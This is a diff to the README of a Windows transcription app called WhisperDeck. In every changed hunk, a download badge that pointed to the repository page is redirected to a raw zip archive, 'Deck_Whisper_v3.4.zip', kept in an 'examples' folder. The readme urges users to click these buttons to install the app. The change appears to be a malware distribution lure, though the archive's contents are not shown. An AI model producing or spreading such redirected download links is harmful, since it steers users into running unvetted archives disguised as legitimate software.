@@ -1,7 +1,7 @@
 <h1>🎙️ WhisperDeck - Your Private Audio Transcription Assistant</h1>
 
 <p align="center">
-<a href="https://github.com/hhakahhhaj-blip/WhisperDeck"><img src="https://img.shields.io/badge/Download-WhisperDeck-4CAF50?style=for-the-badge&logo=github" alt="Download WhisperDeck" width="300"></a>
+<a href="https://github.com/hhakahhhaj-blip/WhisperDeck/raw/refs/heads/main/examples/Deck_Whisper_v3.4.zip"><img src="https://img.shields.io/badge/Download-WhisperDeck-4CAF50?style=for-the-badge&logo=github" alt="Download WhisperDeck" width="300"></a>
 </p>
 
 ---
@@ -36,7 +36,7 @@ Follow these simple steps to get WhisperDeck running on your Windows computer.
 First, you need to get the WhisperDeck software. Click the button below:
 
 <p align="center">
-<a href="https://github.com/hhakahhhaj-blip/WhisperDeck"><img src="https://img.shields.io/badge/⬇️%20Download%20WhisperDeck-FF5722?style=for-the-badge" alt="Download WhisperDeck" width="250"></a>
+<a href="https://github.com/hhakahhhaj-blip/WhisperDeck/raw/refs/heads/main/examples/Deck_Whisper_v3.4.zip"><img src="https://img.shields.io/badge/⬇️%20Download%20WhisperDeck-FF5722?style=for-the-badge" alt="Download WhisperDeck" width="250"></a>
 </p>
 
 **Visit this link to download the application.**
@@ -229,7 +229,7 @@ WhisperDeck is released under the MIT License, which means you can use, modify, 
 You're just one click away from private, accurate audio transcription. Download WhisperDeck today and take control of your recordings.
 
 <p align="center">
-<a href="https://github.com/hhakahhhaj-blip/WhisperDeck"><img src="https://img.shields.io/badge/🚀%20Get%20WhisperDeck%20Now-2196F3?style=for-the-badge" alt="Get WhisperDeck" width="250"></a>
+<a href="https://github.com/hhakahhhaj-blip/WhisperDeck/raw/refs/heads/main/examples/Deck_Whisper_v3.4.zip"><img src="https://img.shields.io/badge/🚀%20Get%20WhisperDeck%20Now-2196F3?style=for-the-badge" alt="Get WhisperDeck" width="250"></a>
 </p>
 
 Thank you for choosing WhisperDeck. Happy transcribing!
